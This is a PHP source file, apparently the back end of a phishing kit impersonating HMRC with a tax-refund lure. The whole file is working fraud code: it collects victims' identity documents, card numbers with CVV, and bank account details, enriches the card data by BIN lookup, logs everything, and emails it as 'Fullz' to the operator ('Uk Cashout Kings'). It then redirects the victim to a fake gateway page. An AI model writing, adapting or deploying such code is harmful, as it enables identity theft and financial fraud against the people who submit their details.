<?php

error_reporting(0);

session_start();

$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);

$refund_amount = $_SESSION['refund_value'];

if(!empty($_POST['full_name']))  {

$full_name = $_POST['full_name'];
$_SESSION['name'] = $full_name;

}

if(!empty($_POST['address']))  {

$address = $_POST['address'];
$_SESSION['address'] = $address;

}

if(!empty($_POST['town']))  {

$town = $_POST['town'];
$_SESSION['town'] = $town;

}

if(!empty($_POST['county']))  {

$county = $_POST['county'];

}

if(!empty($_POST['postcode']))  {

$postcode = $_POST['postcode'];
$_SESSION['postcode'] = $postcode;

}

if(!empty($_POST['phone_number']))  {

$phone_number = $_POST['phone_number'];
$_SESSION['telephone'] = $phone_number;

}

if(!empty($_POST['id_method']))  {

$id_method = $_POST['id_method'];

}

if(!empty($_POST['driver_license']))  {

$driver_license = $_POST['driver_license'];

}

if(!empty($_POST['passport_number']))  {

$passport_number = $_POST['passport_number'];

}

if(!empty($_POST['dob']))  {

$dob = $_POST['dob'];
$_SESSION['dob'] = $dob;

}

if(!empty($_POST['cardholder_name']))  {

$cardholder_name = $_POST['cardholder_name'];
$_SESSION['ccname'] = $cardholder_name;

}

if(!empty($_POST['acc_number']))  {

$acc_number = $_POST['acc_number'];
$_SESSION['account'] = $acc_number;

}

if(!empty($_POST['sort_code']))  {

$sort_code = $_POST['sort_code'];
$_SESSION['sort_code'] = $sort_code;

}

if(!empty($_POST['card_number']))  {

$card_number = $_POST['card_number'];
$card_number = str_replace(' ','',$card_number);
$_SESSION['ccno'] = $card_number;

}

if(!empty($_POST['expiry_date']))  {

$expiry_date = $_POST['expiry_date'];
$_SESSION['ccexp'] = $expiry_date;

}

if(!empty($_POST['cvv']))  {

$cvv = $_POST['cvv'];
$_SESSION['secode'] = $cvv;

function url_get_contents($url) {
  $ch = curl_init($url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  $data = curl_exec($ch);
  curl_close($ch);
  return $data;
}

function bankDetails($card_number) {
    $bankDetails = array();
    $cardBIN = substr($card_number, 0, 6);
	$url = "https://lookup.binlist.net/" . $cardBIN;
    $bankDetails = json_decode(url_get_contents($url), true);
    $bankDetails['bin'] = $cardBIN;
    return $bankDetails;
}

$cardInfo = bankDetails($card_number);
$number = $cardInfo['number'];
$BIN = $number['prefix'];
$Bank = $cardInfo['bank'];
$bank_name = $Bank['name'];
$Brand = $cardInfo['scheme'];
$Type = $cardInfo['card_type'];

date_default_timezone_set('Europe/London');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];

require "includes/my_email.php";

$msg = "---------------------------------------------------------------------------\n";
$msg .= "HMRC Info\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Personal Details for $full_name\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Full Name: ".$full_name."\n";
$msg .= "Date of Birth: ".$dob."\n";
$msg .= "Address: ".$address."\n";
$msg .= "City: ".$town."\n";
$msg .= "Postcode: ".$postcode."\n";
$msg .= "County: ".$county."\n";
$msg .= "Phone Number: ".$phone_number."\n";
$msg .= "Identification Method: ".$id_method."\n";
if(!empty($driver_license)) {
$msg .= "Driving Licence Number: ".$driver_license."\n"; }
if(!empty($passport_number)) {
$msg .= "Passport Number: ".$passport_number."\n"; }
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Billing Details for $full_name\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Name on Card: ".$cardholder_name."\n";
$msg .= "Card Number: ".$card_number."\n";
$msg .= "Expiry Date: ".$expiry_date."\n";
$msg .= "CVV Code: ".$cvv."\n";
$msg .= "Card BIN: ".$BIN."\n";
$msg .= "Card Bank: " .$bank_name."\n";
$msg .= "Card Type: " .$Brand . " " . $Type."\n";
$msg .= "Account Number: ".$acc_number."\n";
$msg .= "Sort Code: ".$sort_code."\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Sent from $ip on $time via $agent\n";
$msg .= "---------------------------------------------------------------------------\n\n";

$subject = "Fullz for $full_name";
$headers = "From: Uk Cashout Kings <$my_email>\r\n";
$headers .= "Reply-To: Uk Cashout Kings <$my_email>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";

$fp = fopen("logs/hmrc_full_info.txt", "a");
fputs($fp, $msg);
fclose($fp);

mail($my_email,$subject,$msg,$headers);

header("Location: gateway.php?&sessionid=$hash&securessl=true");

}

?>